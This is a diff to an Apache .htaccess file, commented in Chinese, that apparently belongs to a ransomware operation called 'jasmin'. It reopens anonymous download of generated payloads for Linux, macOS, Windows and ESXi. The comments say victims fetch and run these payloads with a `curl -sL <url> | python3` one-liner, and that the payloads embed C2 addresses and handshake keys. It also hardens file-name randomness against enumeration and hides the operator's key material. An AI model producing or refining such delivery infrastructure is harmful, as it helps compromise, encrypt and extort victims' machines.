@@ -26,10 +26,14 @@ RewriteEngine On
     RewriteRule ^database/ - [F,L]
     RewriteRule ^templates/ - [F,L]
 
-    # 生成的载荷内嵌 C2 地址与握手密钥，不能匿名下载（应由需登录的下载流程下发）。
-    # payloads/ 下仍公开的是解密工具与加密私钥（jasmin_unlock.*、jasmin_decrypt*、
-    # jasmin_diagnose.sh、jasmin_private.pem.enc），它们不以 jasmin_{平台}_ 开头。
-    RewriteRule ^payloads/jasmin_(linux|macos|win|esxi)_ - [F,L]
-    # 密钥备份（keygen 重建时归档）同样不可下载
+    # 生成的载荷必须可匿名下载 —— 投放方式是 `curl -sL <url> | python3`，
+    # 受害机器上没有会话可登录。载荷本身是明文脚本，拿到它就等于拿到里面的
+    # C2 地址与握手密钥，拦截下载并不增加安全性，只会让载荷无法投放。
+    # （曾经在此拦过 ^payloads/jasmin_(linux|macos|win|esxi)_，已回退；
+    #   文件名随机段已由 32 bit 提到 128 bit 以抵抗枚举。）
+    # 密钥备份（keygen 重建时归档）仍然不可下载
     RewriteRule ^payloads/.*\.bak\. - [F,L]
+    # 真正的密钥 material 直接拒绝（私钥、AES 口令）—— 无需匿名分发：
+    # 解密侧使用的是 jasmin_private.pem.enc 与 jasmin_unlock.*
+    RewriteRule ^payloads/(jasmin_private\.pem|\.key_secret)$ - [F,L]
 </IfModule>
